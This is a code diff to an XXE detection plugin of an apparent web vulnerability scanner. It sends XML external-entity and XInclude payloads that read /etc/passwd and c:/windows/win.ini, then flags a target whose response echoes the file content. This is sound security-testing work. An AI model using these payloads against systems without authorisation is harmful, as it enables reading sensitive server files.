@@ -4,7 +4,6 @@ import (
 	"glint/fastreq"
 	"glint/plugin"
 	"glint/util"
-	"regexp"
 	"strings"
 
 	"github.com/thoas/go-funk"
@@ -63,19 +62,24 @@ func Xxe(args interface{}) (*util.ScanResult, error) {
 	// 	return nil, err
 	// }
 
-	var xmlversion bool
-	reg := `^\s*<\?xml`
-	match, _ := regexp.MatchString(reg, string(body))
-	if match {
-		xmlversion = true
-	}
-	xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
+	// var xmlversion bool
+	// reg := `^\s*<\?xml`
+	// match, _ := regexp.MatchString(reg, string(body))
+	// if match {
+	// 	xmlversion = true
+	// }
+	// xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
 	payloads := []string{
 		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
 		`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
 	}
+
+	win_pl := []string{
+		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///c:/windows/win.ini">]>`,
+	}
+
 	//"application/xml;charset=UTF-8"
-	if funk.Contains(ContentType, "text/xml") || funk.Contains(ContentType, "application/xml") {
+	if funk.Contains(ContentType, "text/xml") {
 		for _, pl := range payloads {
 			if strings.ToUpper(method) == "POST" {
 				req1, resp1, errs := sess.Post(url, headers, []byte(pl))
@@ -103,13 +107,36 @@ func Xxe(args interface{}) (*util.ScanResult, error) {
 		// 	`<!DOCTYPE foo SYSTEM "{}">`,
 		// }
 
-		for _, pl := range bind_payloads {
-			if xmlversion {
-				pl_ := xmlversion_text + "\r\n" + pl
-			}
-			info := "xxe_" + self.parser.getfilepath()
-		}
+		// for _, pl := range bind_payloads {
+		// 	if xmlversion {
+		// 		pl_ := xmlversion_text + "\r\n" + pl
+		// 	}
+		// 	info := "xxe_" + self.parser.getfilepath()
+		// }
 
+	}
+	if funk.Contains(ContentType, "application/xml") {
+		for _, pl := range win_pl {
+			if strings.ToUpper(method) == "POST" {
+				npl := append([]byte(pl), body...)
+				if strings.ToUpper(method) == "POST" {
+					req1, resp1, errs := sess.Post(url, headers, []byte(npl))
+					if errs != nil {
+						return nil, errs
+					}
+					body := string(resp1.Body())
+					if funk.Contains(body, "for 16-bit app") {
+						Result := util.VulnerableTcpOrUdpResult(url,
+							"xxe Vulnerable",
+							[]string{string(req1.String())},
+							[]string{string(body)},
+							"high",
+							session["hostid"].(int64))
+						return Result, errs
+					}
+				}
+			}
+		}
 	}
 
 	return nil, err
